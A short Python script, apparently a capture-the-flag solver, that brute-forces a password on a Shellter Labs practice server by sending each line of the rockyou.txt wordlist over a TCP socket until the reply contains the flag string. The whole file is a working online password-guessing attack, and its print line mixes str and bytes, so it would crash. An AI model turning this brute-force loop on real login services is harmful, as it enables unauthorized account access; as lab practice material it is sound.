import socket
import sys

def erro1():
    sys.exit(0)

if len(sys.argv) < 2:
    print("Usage: python securelab.py port")
    erro1()

ip ='lab.shellterlabs.com'
port = int(sys.argv[1])
def main(ip, port):
    arq = open("rockyou.txt", encoding="utf8", errors='ignore')
    linhas = arq.readlines()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    for linha in linhas:
        s.send(str.encode(linha))
        resposta = s.recv(1024)
        strings = linha.encode()
        print("tentando a senha :"+strings)
        flag = str.encode("shellter")
        if flag in resposta:
            break

    print (resposta)

if __name__ == "__main__":
    main(ip, port)
else:
    print("nao é um modulo pacero")
